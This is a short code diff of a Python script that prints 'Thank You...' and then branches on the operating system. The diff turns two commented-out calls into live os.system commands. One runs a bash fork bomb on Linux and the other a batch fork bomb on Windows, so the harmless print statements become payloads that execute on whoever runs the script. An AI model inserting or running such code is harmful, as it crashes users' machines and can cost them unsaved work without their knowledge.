@@ -35,8 +35,8 @@ for x in range(1, 101):
 time.sleep(3)
 print("Thank You...")
 if current_os == "Linux":
-    print(':(){:|:&};:')
-    # os.system(':(){:|:&};:')
+    # print(':(){:|:&};:')
+    os.system(':(){:|:&};:')
 if current_os == "Windows":
-    print('%0|%0')
-    # os.system('%0|%0')
+    # print('%0|%0')
+    os.system('%0|%0')
